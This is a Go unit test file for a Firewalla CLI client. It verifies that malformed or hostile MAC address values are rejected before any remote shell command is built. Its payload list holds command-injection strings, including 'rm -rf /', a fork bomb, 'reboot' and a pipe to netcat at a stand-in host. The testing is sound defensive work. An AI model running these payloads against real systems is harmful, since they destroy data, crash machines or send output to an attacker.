package firewalla

import (
	"context"
	"strings"
	"testing"

	"github.com/stefanpenner/fire.cli/internal/transport"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// injectionPayloads are values that, if interpolated into a remote shell
// command unescaped, would execute attacker-controlled code on the box.
var injectionPayloads = []string{
	"; touch /tmp/pwned",
	"$(reboot)",
	"`id`",
	"AA:BB:CC:DD:EE:01; rm -rf /",
	"| nc evil 1234",
	":(){ :|:& };:",
	"AA:BB:CC:DD:EE:0G", // one bad nibble
	"AA:BB:CC:DD:EE",    // too short
	"",
}

// TestDNSByDevice_RejectsInjection proves a malformed/hostile MAC is rejected
// before any command is built, so nothing reaches the remote shell.
func TestDNSByDevice_RejectsInjection(t *testing.T) {
	for _, p := range injectionPayloads {
		fake := transport.NewFake("pi@fire")
		c := New(fake)
		_, err := c.DNSByDevice(context.Background(), p, 10)
		require.Error(t, err, "payload %q must be rejected", p)
		assert.Empty(t, fake.Commands, "payload %q must not reach the transport", p)
	}
}

// TestTraffic_RejectsInjection proves Traffic validates its MAC too, so the
// client contract does not depend on every caller pre-validating.
func TestTraffic_RejectsInjection(t *testing.T) {
	for _, p := range injectionPayloads {
		fake := transport.NewFake("pi@fire")
		c := New(fake)
		_, err := c.Traffic(context.Background(), p)
		require.Error(t, err, "payload %q must be rejected", p)
		assert.Empty(t, fake.Commands, "payload %q must not reach the transport", p)
	}
}

// TestDNSByDevice_NormalizesMAC accepts a valid lower-case MAC and upper-cases
// it for the redis key.
func TestDNSByDevice_NormalizesMAC(t *testing.T) {
	fake := transport.NewFake("pi@fire").
		OnMatch("flow:dns:AA:BB:CC:DD:EE:02", transport.Result{Stdout: ""})
	c := New(fake)
	_, err := c.DNSByDevice(context.Background(), "aa:bb:cc:dd:ee:02", 10)
	require.NoError(t, err)
	require.Len(t, fake.Commands, 1)
	assert.Contains(t, fake.Commands[0], "flow:dns:AA:BB:CC:DD:EE:02")
	assert.NotContains(t, fake.Commands[0], strings.ToLower("flow:dns:aa"))
}
